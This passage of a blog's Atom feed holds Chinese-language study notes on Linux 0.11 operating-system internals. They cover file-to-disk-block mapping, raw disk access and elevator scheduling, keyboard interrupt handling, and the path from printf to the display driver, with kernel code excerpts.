    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>如何从文件得到盘块号!</strong></p><p>###为什么引入文件</p><ul><li><p>引入第三层抽象.</p><p>让普通用户使用raw disk,操作信息更加简单.</p><p>用户眼中的文件是字符流的样子</p><p>而磁盘上的文件盘块接在一起.</p><ul><li>方法:建立字符流到盘块集合的映射关系<ul><li>映射的作用:字符流对应相应盘块号,处理相关字符就处理对应的盘块,与内存缓冲区进行交互.然后电梯队列进行写入,修改.</li></ul></li><li>操作系统封装了映射,对用户隐藏细节.</li></ul><h3 id="实现文件的数据结构"><a href="#实现文件的数据结构" class="headerlink" title="实现文件的数据结构"></a>实现文件的数据结构</h3><p>唯一的算出相应的盘块</p><ul><li><p>连续结构,</p><p>映射表中存放各个字符流的首地址和使用块数</p><p><img src="https://i.loli.net/2019/02/19/5c6b0ad3a8a7e.jpg" alt></p><p>局限性:文件需要整体拷贝,效率低下.直接存取很快,类似于数组,动态增长很吃力</p></li><li><p>链式结构实现文件(链表)</p><p>适合动态增长</p><p>局限性:存取慢</p></li><li><p>索引结构</p><p>有一个块专门做索引提供文件的对应盘块号</p><p><img src="https://i.loli.net/2019/02/19/5c6b10f402a56.jpg" alt></p></li></ul><ol><li>根据FCB先读入索引表</li><li>一旦开始读写200-212,就把索引块读出来,然后查找200-212,若对应1号盘块,则读写改变</li></ol><p>比链式结构块!,既适合读取也适合增长</p></li></ul><h3 id="实际系统使用的数据结构"><a href="#实际系统使用的数据结构" class="headerlink" title="实际系统使用的数据结构"></a>实际系统使用的数据结构</h3><p><strong>多级索引</strong></p><p><img src="https://i.loli.net/2019/02/19/5c6b127d99aba.jpg" alt></p><ul><li>小文件直接读写盘块</li><li>中型通过一阶间接索引读取</li><li>大型使用多级索引</li></ul><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li><p>小文件高校访问</p></li><li><p>可以表示很大的文件</p></li><li><p>中等大小的文件访问也不慢</p></li></ul><p>实现了折中</p><p>通过维护文件中的inode信息,控制FCB信息,得到盘块号.磁盘中断时,从电梯队列中取出来,算出CHS,再通过out发到具体的磁盘马达驱动器上.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://xwdidi.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="驱动" scheme="http://xwdidi.top/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="I/O" scheme="http://xwdidi.top/tags/I-O/"/>
    
  </entry>
  
  <entry>
    <title>设备驱动与文件系统    L28 生磁盘的使用</title>
    <link href="http://xwdidi.top/2019/02/16/2019-02-16-L28-%E7%94%9F%E7%A3%81%E7%9B%98%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://xwdidi.top/2019/02/16/2019-02-16-L28-生磁盘的使用/</id>
    <published>2019-02-15T16:00:00.000Z</published>
    <updated>2019-04-06T13:56:34.504Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前文回顾"><a href="#前文回顾" class="headerlink" title="前文回顾"></a>前文回顾</h3><h3 id="本文重点"><a href="#本文重点" class="headerlink" title="本文重点"></a>本文重点</h3><p>让磁盘直接被使用起来,让磁盘工作起来.</p><p>​    发出一个读命令<br>​    将数据送往内存<br>​    读完后向CPU发出中断</p><ol><li><p>CPU向磁盘驱动器中的寄存器读写数据</p></li><li><p>磁盘控制器完成真正的工作,并向CPU发中断的信号</p></li></ol><h4 id="使用磁盘从认识磁盘开始"><a href="#使用磁盘从认识磁盘开始" class="headerlink" title="使用磁盘从认识磁盘开始"></a>使用磁盘从认识磁盘开始</h4><p><img src="https://i.loli.net/2019/02/15/5c65d554bb1f6.jpg" alt></p><h5 id="如何读-写一字节呢"><a href="#如何读-写一字节呢" class="headerlink" title="如何读/写一字节呢"></a>如何读/写一字节呢</h5><ol><li><p>移动到指定的磁道里</p><p>然后再一转,磁生电,将数据写到内存中</p></li><li><p>数据写入内存中</p><p>移动到指定的磁道里</p><p>转动,电生磁,将数据刻入到磁盘扇区里</p></li></ol><p>   移动磁头,旋转磁盘,和内存缓冲进行读写**</p><h4 id="直接使用磁盘"><a href="#直接使用磁盘" class="headerlink" title="直接使用磁盘"></a>直接使用磁盘</h4><p>程序告诉磁盘控制器’柱面’,’磁头’,’扇区’,’缓存位置’这几个参数</p><p><img src="https://img-blog.csdn.net/20140223134118796?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveGlhb21pbnRoZXJl/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p><p>柱面(C):硬盘中，不同盘片相同半径的磁道所组成的圆柱称为柱面</p><p>磁头(head):根据磁头读相应盘面</p><p>扇区:磁道按相应规则划分具有一定弧度的磁道部分</p><p>不同半径的同心圆称为磁道</p><p>缓冲位置</p><p>根据上速条件,可以利用DMA将磁盘与内存的数据进行交互</p><p><img src="https://i.loli.net/2019/02/15/5c65e378e8694.jpg" alt></p><p>通过out指令将各个参数信息通过移位得到磁盘控制器能识别的数据放到对应的端口上,</p><p>这个办法太过于直接,过于复杂.</p><h3 id="第一层抽象"><a href="#第一层抽象" class="headerlink" title="第一层抽象"></a>第一层抽象</h3><p>通过盘块号读写磁盘</p><ul><li><p>磁盘驱动负责从block计算出cyl，head，sec（CHS）</p><p>隐藏细节,减少用户负担.</p></li><li><p>如何编址呢?为什么这样做呢?</p><p>访问相邻的盘块可以快速读出.</p></li></ul><p>  磁盘访问时间=写入控制器时间+寻道时间(12ms to 8ms)+旋转时间(7200转,4ms半周)+传输时间(50m/s, 0.3s).</p><p>  寻道时间占主要时间,那么就尽量少寻道,所以相邻盘块号应该放在相邻或同一磁道上.</p><h4 id="从CHS到扇区号，从扇区到盘块"><a href="#从CHS到扇区号，从扇区到盘块" class="headerlink" title="从CHS到扇区号，从扇区到盘块"></a>从CHS到扇区号，从扇区到盘块</h4><p>通过C H S计算出block号,CxHxS+HxS+S</p><p><img src="https://i.loli.net/2019/02/16/5c67291c09111.jpg" alt></p><p>寻道时间+旋转时间仍占主要因素.用空间利用率的下降换取效率.的提升.一个盘块就是连续的几个扇区</p><p>根据盘块号访问多个扇区,提升读写速度</p><h4 id="接着使用磁盘-输出block"><a href="#接着使用磁盘-输出block" class="headerlink" title="接着使用磁盘 输出block"></a>接着使用磁盘 输出block</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">make_request</span><span class="params">()</span></span>&#123; <span class="comment">//处理磁盘请求</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> *<span class="title">req</span>;</span></span><br><span class="line">req = requrest+NR_REQUEST;</span><br><span class="line">req-&gt;sector = bh-&gt;b_blocknr&lt;&lt;<span class="number">1</span>;<span class="comment">//根据block号算出扇区号,linux0.11的盘块是两个扇区</span></span><br><span class="line">    </span><br><span class="line">add_request(major+blk_dev,req);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/16/5c674d1f598a9.jpg" alt></p><p>再使用得到的扇区数通过<code>divl</code>指令和<code>block = Cx(SxH)+HxS+S</code>公式得到相应的C H S,柱面磁头扇区</p><p><code>nsect</code>:每个盘块所拥有的扇区数量</p><h3 id="第二层抽象"><a href="#第二层抽象" class="headerlink" title="第二层抽象"></a>第二层抽象</h3><h4 id="多个进程通过队列使用磁盘"><a href="#多个进程通过队列使用磁盘" class="headerlink" title="多个进程通过队列使用磁盘"></a>多个进程通过队列使用磁盘</h4><p><img src="https://i.loli.net/2019/02/16/5c6750ba29511.jpg" alt></p><p>在磁盘驱动时,从请求队列取出.在磁盘中断时,从队列中取出</p><p>第二层抽象的核心在于请求队列中的调度问题,这时候我们来讨论讨论调度算法.(目标是平均访问延迟小,寻道时间是主要矛盾)</p><ol><li>FCFS</li></ol><p>磁盘作旋转运动,磁头在长途奔波.过于追求目的磁道,为何不顺路把路过的磁道也处理了呢?</p><ol start="2"><li><p>SSTF磁盘调度 短寻道优先</p><p>磁头总是在中间柱面晃荡,会造成饥饿</p></li><li><p>最终 : scan 扫描调度(电机算法)</p><p>SSTF+中途不回折:每个请求都有处理的机会</p></li><li><p>c-scan (电梯算法)</p><p>scan+直接移到另一端:两端都能很快的处理</p></li></ol><p><img src="https://i.loli.net/2019/02/16/5c675a3430b8e.jpg" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//终止条件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((IN_ORDER(tmp,req)||!IN_ORDER(tmp,tmp_&gt;next))&amp;&amp;IN_ORDER(req,tmp-&gt;next))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OM_ORDER(s1,s20) \</span></span><br><span class="line">(s1)-&gt;dev&lt;(s2)-&gt;dev||(s1)-&gt;dev ==(s2)-&gt;dev\</span><br><span class="line">&amp;&amp; (s1)-&gt;sector&lt;(s2)_&gt;sector))</span><br><span class="line"><span class="comment">//IN_ORDER满足s1&lt;s2,就是c1&lt;c2根据柱面号排队列</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> tmp&lt;req&lt;next</span><br><span class="line"><span class="number">2.</span> tmp&gt;next req&lt;next -&gt;tmp&gt;next&gt;req</span><br></pre></td></tr></table></figure><h4 id="生磁盘使用整理"><a href="#生磁盘使用整理" class="headerlink" title="生磁盘使用整理"></a>生磁盘使用整理</h4><ol><li><p>进程得到盘块号,算出扇区号(sector)</p></li><li><p>用扇区号make req(做出磁盘请求,涉及内存缓冲申请和管理),用电梯算法add_request</p></li><li><p>进程sleep_on()(进程间同步)</p></li><li><p>进行中断处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">read_intr</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">end_request(<span class="number">1</span>);<span class="comment">//唤醒进程</span></span><br><span class="line"></span><br><span class="line">    do_hd_request(),</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>do_hd_request算出cyl,head,sector</p></li><li><p>hd_out调用outp(…)完成端口写</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://xwdidi.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="驱动" scheme="http://xwdidi.top/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="I/O" scheme="http://xwdidi.top/tags/I-O/"/>
    
  </entry>
  
  <entry>
    <title>设备驱动与文件系统    L27 键盘</title>
    <link href="http://xwdidi.top/2018/12/30/2018-12-30-L27-%E9%94%AE%E7%9B%98/"/>
    <id>http://xwdidi.top/2018/12/30/2018-12-30-L27-键盘/</id>
    <published>2018-12-29T16:00:00.000Z</published>
    <updated>2019-04-06T13:55:18.446Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前提提要"><a href="#前提提要" class="headerlink" title="前提提要"></a>前提提要</h2><p>设备的驱动,举了例子是显示器.</p><p>显示器是输出,键盘做基础的输入.</p><p>显示器和键盘合在一起是中断设备.</p><h2 id="本章重点"><a href="#本章重点" class="headerlink" title="本章重点"></a>本章重点</h2><h3 id="操作系统是怎么使用键盘的"><a href="#操作系统是怎么使用键盘的" class="headerlink" title="操作系统是怎么使用键盘的."></a>操作系统是怎么使用键盘的.</h3><p><img src="https://i.loli.net/2018/12/29/5c27785716fdb.jpg" alt></p><ol><li>out指令向外设发出命令</li><li>通过文件形成统一的文件视图</li><li>进行中断处理</li></ol><p>本章着重讲<strong>中断处理</strong></p><h3 id="如何使用键盘"><a href="#如何使用键盘" class="headerlink" title="如何使用键盘"></a>如何使用键盘</h3><ol><li><p>对于使用者: 敲键盘,看结果</p></li><li><p>对于OS,”等着”你敲键盘,敲了就中断</p></li><li><p>从键盘中断开始,也就是中断初始化开始.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_init</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">//应为键盘也是console的一部分</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_trap_gate(<span class="number">0x21</span>, &amp;ketborad_interrupt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在kerne1/chr drv/keyboard.s中</span></span><br><span class="line">   </span><br><span class="line">.glob1_keyboard_interrupt_keyboard_interrupt:</span><br><span class="line">inb $<span class="number">0x60</span>, %a1<span class="comment">//从端口0x60读扫描吗,从控制器中的缓冲中读出来(ASCII码)</span></span><br><span class="line">   </span><br><span class="line"><span class="function">cal1 <span class="title">key_table</span><span class="params">(,%eax，<span class="number">4</span>)</span><span class="comment">//调用key_table+eax*4根据扫面码决定调用的函数.</span></span></span><br><span class="line"><span class="function">   </span></span><br><span class="line">… push $0 call_do_tty_interrupt</span><br></pre></td></tr></table></figure><p>解析key_table,是函数数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在kernel/chr_drv/keyborad.s中</span></span><br><span class="line"></span><br><span class="line">key_table:</span><br><span class="line">.<span class="keyword">long</span> none,do_self,do_self,do_self<span class="comment">//扫描码00-03,显示字符通常使用此函数进行处理</span></span><br><span class="line">        </span><br><span class="line">.<span class="keyword">long</span> do_self, ... ,func,scroll,cursor 等等<span class="comment">//func是反应f功能键的函数</span></span><br></pre></td></tr></table></figure><p>扫描码02对应对应按键1;01对应esc;12对应E等等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mode:.byte 0</span><br><span class="line">do_self:</span><br><span class="line">lea alt_map,%ebx //找到映射表，如a的key_map映射为a，而shift_map映射为A</span><br><span class="line"></span><br><span class="line">testb $0x20,mode//alt键是否同时按下 </span><br><span class="line"></span><br><span class="line">jne 1f lea_shift_map,%ebx </span><br><span class="line">testb $0x03,mode </span><br><span class="line">jne 1f lea_key_map,%ebx</span><br><span class="line">1：</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://i.loli.net/2018/12/31/5c29eafe4d44b.jpg" alt></p><p>​    通过ebx获得的起始地址和扫描码得到的偏移可写字符的ascii码,并且赋值给al.在放入到缓冲队列中.等进程执行获取队列中的数据. </p><p><img src="![1546251599844](C:\Users\ZJL\AppData\Roaming\Typora\typora-user-images\1546251599844.png" alt></p><p>tty_table[],终端设备使用的函数,</p><p>然后将al输入到队列的头部.</p><h4 id="现在没有回显功能"><a href="#现在没有回显功能" class="headerlink" title="现在没有回显功能."></a>现在没有回显功能.</h4><p><img src="https://i.loli.net/2018/12/31/5c29eefc71b52.jpg" alt></p><p>加工字符,将字符数据写入到显示队列中,然后显示字符.</p><h3 id="键盘的中断处理"><a href="#键盘的中断处理" class="headerlink" title="键盘的中断处理"></a>键盘的中断处理</h3><p><img src="https://i.loli.net/2018/12/31/5c29efd5b9981.jpg" alt></p><p>secondary中的数据才是scanf所需要的字符.</p><p>然后在write_q.显示</p><p><img src="https://i.loli.net/2018/12/31/5c29f091f070e.jpg" alt></p><ol><li>通过系统调用形成的统一的文件视图</li><li>最终落实到out/in指令</li><li>中断处理</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://xwdidi.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="驱动" scheme="http://xwdidi.top/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="I/O" scheme="http://xwdidi.top/tags/I-O/"/>
    
  </entry>
  
  <entry>
    <title>设备驱动与文件系统  L26 I/O与显示器</title>
    <link href="http://xwdidi.top/2018/12/29/2018-12-29-L26-IO%E4%B8%8E%E6%98%BE%E7%A4%BA%E5%99%A8/"/>
    <id>http://xwdidi.top/2018/12/29/2018-12-29-L26-IO与显示器/</id>
    <published>2018-12-28T16:00:00.000Z</published>
    <updated>2019-04-06T13:55:08.706Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前文提要"><a href="#前文提要" class="headerlink" title="前文提要"></a>前文提要</h2><p>操作系统是管理硬件的软件.</p><p><img src="https://i.loli.net/2018/12/29/5c27785716fdb.jpg" alt>)学习得知<code>printf()</code>函数是如何将文字打印到显示屏上的</p><p>I\O设备:键盘和显示器,磁盘,文件系统(驱动磁盘设备)</p><p>##重点知识解析</p><h4 id="如何让外设工作"><a href="#如何让外设工作" class="headerlink" title="如何让外设工作"></a>如何让外设工作</h4><p>CPU发出指令,给显卡or键盘中的寄存器or磁盘控制的寄存器等等写入内容.也就是给相应的寄存器写入东西,通过本身的电路(芯片)进行操控设备.再通过这些设备操作外设.</p><ul><li>发出写命令</li><li>向CPU发出中断</li><li>读数据到内存</li></ul><p>发出核心指令类似这条<code>out xx,a</code>,这样就能让外设工作.外设完事之后,在进行中断的处理</p><ul><li>CPU向控制器中的寄存器读写数据</li><li>控制器完成真正的工作,并向CPU发出中断操作</li></ul><p>外设驱动过程:</p><ol><li><p>out指令(<code>out</code>)</p></li><li><p>外设执行后,要中断处理</p></li><li><p>提供统一的文件视图(接口),不同设备的控制器不一样. (printf)这样方便</p></li></ol><h3 id="一段操纵外设的程序"><a href="#一段操纵外设的程序" class="headerlink" title="一段操纵外设的程序"></a>一段操纵外设的程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/xxx"</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">    write(fd,i,<span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line">&#125;</span><br><span class="line">close(fd)</span><br></pre></td></tr></table></figure><ol><li>不论什么设备都是open，read，write，close操作系统为用户提供统一的接口!</li><li>不同的设备对应不同的设备文件（（/devlxxx）根据设备文件找到控制器的地址、内容格式等等！</li></ol><p><img src="https://i.loli.net/2018/12/29/5c27805da34f4.jpg" alt></p><p>进行相应处理,根据文件名进行解释,到达控制器作用于实际的外设上,在进行中断处理.</p><h3 id="从操作文件的接口开始-开始给显示器输出"><a href="#从操作文件的接口开始-开始给显示器输出" class="headerlink" title="从操作文件的接口开始,开始给显示器输出"></a>从操作文件的接口开始,开始给显示器输出</h3><ol><li><code>printf(&quot;Host Name: %s&quot;,name)</code></li></ol><ul><li>先创建缓存buf将格式化输出都写到那里，然后write(1，buf.…)[写入显示器]明白<code>write</code>是如何实现的.最终指向<code>out</code>指令.out不同的端口or接口. </li></ul><ol start="2"><li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在linux/fs/read write.c中</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">char</span>*buf, <span class="keyword">int</span> count)</span><span class="comment">//fd是file的索引</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>*<span class="title">file</span>;</span></span><br><span class="line">file=current-&gt;filp[fd]; <span class="comment">//fd = 1,代表这1的地方是一个文件.current代表当前进程</span></span><br><span class="line">    </span><br><span class="line">inode=file-&gt;f_inode;<span class="comment">//取出文件信息(显示器的信息应该就在这里)</span></span><br></pre></td></tr></table></figure><p>1是如何使用的呢.1给fd赋值.</p></li><li><p>fd=1的filp从哪里来？</p><p>因为是被current指向,所以是fork中来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_process</span><span class="params">(...)</span></span>&#123;</span><br><span class="line">    *p = *current;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;NR_OPEN;i++)</span><br><span class="line">        <span class="keyword">if</span>((f=p-&gt;filp[i])) f-&gt;f_count++;</span><br></pre></td></tr></table></figure></li></ol><p>这个指针是从父进程继承过来的.</p><p>shel进程启动了whoami命令,shell是其父进程.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;</span><br><span class="line">init();&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    open(<span class="string">"dev/tty0"</span>,O_RDWR,<span class="number">0</span>);dup(<span class="number">0</span>);dup(<span class="number">0</span>);<span class="comment">//dup(0)拷贝两份描述符分别对应1,2.tty0都是终端设备.</span></span><br><span class="line">    </span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>,argv,envp)<span class="comment">// 启动shell代替子进程中的tty0程序</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/dev/tty 代表控制终端</p><p><code>dup()</code>传给该函数一个既有的描述符，返回一个新的描述符，新的描述符是传给它的描述符的拷贝.</p><ol start="4"><li>open系统调用完成了什么呢</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在linux/fs/open.c中,解析目录找到inode</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*filename,<span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">i=open_namei(filename,flag,&amp;inode);<span class="comment">//根据文件名字读入文件</span></span><br><span class="line">    </span><br><span class="line">cuurent-&gt;filp[fd]=f;<span class="comment">//第一个空闲的fd </span></span><br><span class="line">    </span><br><span class="line">f-&gt;f_mode=inode-&gt;i_mode;</span><br><span class="line">f-&gt;f_inode=inode;<span class="comment">//读入inode,有着具体信息.</span></span><br><span class="line">    </span><br><span class="line">f-&gt;f_count=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> fd;&#125;</span><br></pre></td></tr></table></figure><p>核心就是形成这样的一个链</p><p><img src="https://i.loli.net/2018/12/29/5c2789228e507.jpg" alt></p><p>当前的PCB根据链找到dev/tty对应的inode.根据inode找到所指向的设备.</p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><p>filp中的1由<code>open(&quot;/dev/tty0&quot;)</code>产生.write操作相应的inode写入信息.</p><h4 id="向屏幕输出"><a href="#向屏幕输出" class="headerlink" title="向屏幕输出"></a>向屏幕输出</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在linux/fs/read write.c中</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,<span class="keyword">char</span>*buf,<span class="keyword">int</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">inode = file-&gt;f_node;</span><br><span class="line"><span class="keyword">if</span>(S_ISCHR(inode-&gt;i_mode))<span class="comment">//判断是否是char(字符)设备,</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">return</span> rw_char(WRITE,inode-&gt;i_zone[<span class="number">0</span>],buf,cnt);<span class="comment">//通过inode判断是字符的第几个字符设备</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>转入<code>rw_char</code></p><p>在<code>/dev</code>中输入<code>ls -l</code>,能查主设备号和副设备号</p><p>假设主设备号是4.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在linux/fs/char dev.c中</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rw_char</span><span class="params">(<span class="keyword">int</span> rw,<span class="keyword">int</span> dev,<span class="keyword">char</span>*buf,<span class="keyword">int</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">crw_ptr call_addr=crw_table[MAJOR(dev)];<span class="comment">//通过主设备号查表,获得对应的处理函数地址,赋值给函数指针</span></span><br><span class="line">call_addr(rw,dev,buf,cnt);...&#125;</span><br></pre></td></tr></table></figure><h4 id="看看crw-table"><a href="#看看crw-table" class="headerlink" title="看看crw_table"></a>看看<code>crw_table</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> crw_ptr crw_table[]=&#123;…, rw_ttyx,&#125;;<span class="comment">//第四个是rw_ttyx, crw_table函数指针数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> (*crw_ptr)(<span class="keyword">int</span> rw, <span class="keyword">unsigned</span> minor, <span class="keyword">char</span>* 